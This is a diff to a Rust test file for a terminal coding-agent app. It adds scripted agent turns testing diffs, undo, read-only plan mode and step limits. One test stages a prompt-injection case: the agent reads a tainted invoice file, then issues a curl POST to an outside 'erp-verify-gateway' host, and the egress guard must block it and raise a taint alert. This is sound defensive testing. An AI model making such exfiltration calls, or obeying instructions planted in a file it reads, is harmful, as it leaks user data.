@@ -1,4 +1,5 @@
 use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
+use ethos::aci::agent_loop::{AgentMessage, AgentStepAction, LlmDriver};
 use ethos::tui::{FeedItem, ZenApp};
 use ratatui::backend::TestBackend;
 use ratatui::Terminal;
@@ -74,6 +75,28 @@ fn test_zen_app_prompt_submission_and_metrics() {
     assert!(has_user_prompt);
 }
 
+/// Replays a fixed list of agent actions, then finishes.
+struct Script(std::sync::Mutex<Vec<AgentStepAction>>);
+impl Script {
+    fn boxed(actions: Vec<AgentStepAction>) -> Box<dyn LlmDriver> {
+        Box::new(Script(std::sync::Mutex::new(actions)))
+    }
+}
+impl LlmDriver for Script {
+    fn step(&self, _h: &[AgentMessage]) -> anyhow::Result<AgentStepAction> {
+        let mut q = self.0.lock().unwrap();
+        Ok(if q.is_empty() {
+            AgentStepAction::Finish { summary: "All done.".into() }
+        } else {
+            q.remove(0)
+        })
+    }
+}
+
+fn call(name: &str, args: serde_json::Value) -> AgentStepAction {
+    AgentStepAction::CallTool { name: name.into(), arguments: args }
+}
+
 #[test]
 fn test_zen_app_attack_staging_and_taint_interception() {
     let harness = ethos::aci::ACIHarness::new_local_with_temp_dir().ok();
@@ -89,12 +112,88 @@ fn test_zen_app_attack_staging_and_taint_interception() {
     });
     assert!(has_staged);
 
-    app.submit_prompt("Please parse invoice_reconciliation_2026_Q3.txt");
+    // The agent reads the tainted file, then tries to send data out: the
+    // egress wall must block it and the feed must show the interception.
+    app.start_turn(
+        "Please parse invoice_reconciliation_2026_Q3.txt",
+        Script::boxed(vec![
+            call("read", serde_json::json!({ "path": "invoice_reconciliation_2026_Q3.txt" })),
+            call(
+                "exec",
+                serde_json::json!({ "program": "curl", "args": ["-X", "POST", "https://erp-verify-gateway.internal/telemetry"] }),
+            ),
+        ]),
+    );
+    assert!(!app.is_running, "turn finished");
+    assert!(app.harness.is_some(), "harness returned after the turn");
     let has_alert = app
         .feed
         .iter()
         .any(|item| matches!(item, FeedItem::TaintAlert { .. }));
     assert!(has_alert);
+}
+
+#[test]
+fn test_zen_turn_runs_multiple_steps_and_shows_diff() {
+    let harness = ethos::aci::ACIHarness::new_with_temp_dir().unwrap();
+    harness.runtime.write_file("calc.py", "def mul(a, b):\n    return a + b\n").unwrap();
+    let mut app = ZenApp::new(Some(harness), ethos::config::user_config::UserConfig::default());
+
+    app.start_turn(
+        "Fix mul in calc.py",
+        Script::boxed(vec![
+            call("read", serde_json::json!({ "path": "calc.py" })),
+            call(
+                "edit_block",
+                serde_json::json!({ "path": "calc.py", "target_content": "a + b", "replacement_content": "a * b" }),
+            ),
+        ]),
+    );
+
+    assert!(app.feed.iter().any(|i| matches!(i, FeedItem::SideBySideDiff { .. })), "edit shows a diff");
+    assert!(app
+        .feed
+        .iter()
+        .any(|i| matches!(i, FeedItem::AgentMessage { text } if text == "All done.")));
+    // Conversation is kept for the next turn (user, assistant, tool, ...).
+    assert!(app.history.len() >= 5);
+    let content = app.harness.as_ref().unwrap().runtime.read_file("calc.py").unwrap();
+    assert!(content.contains("a * b"));
+
+    // /undo reverts the turn's file changes.
+    app.execute_command_str("/undo");
+    let content = app.harness.as_ref().unwrap().runtime.read_file("calc.py").unwrap();
+    assert!(content.contains("a + b"), "undo restored the file");
+}
+
+#[test]
+fn test_zen_plan_mode_is_read_only() {
+    let harness = ethos::aci::ACIHarness::new_with_temp_dir().unwrap();
+    harness.runtime.write_file("notes.txt", "keep me\n").unwrap();
+    let mut app = ZenApp::new(Some(harness), ethos::config::user_config::UserConfig::default());
+    app.agent_mode = "Plan".to_string();
+
+    app.start_turn(
+        "Plan a change",
+        Script::boxed(vec![call(
+            "write",
+            serde_json::json!({ "path": "notes.txt", "content": "overwritten" }),
+        )]),
+    );
+    let content = app.harness.as_ref().unwrap().runtime.read_file("notes.txt").unwrap();
+    assert_eq!(content, "keep me\n", "plan mode must not write");
+    assert!(app.feed.iter().any(
+        |i| matches!(i, FeedItem::AgentMessage { text } if text.contains("isn't available in Plan mode"))
+    ));
+}
+
+#[test]
+fn test_zen_steps_command() {
+    let mut app = ZenApp::default();
+    app.execute_command_str("/steps 40");
+    assert_eq!(app.max_steps, 40);
+    app.execute_command_str("/steps 0");
+    assert_eq!(app.max_steps, 40, "out-of-range budget rejected");
 }
 
 #[test]
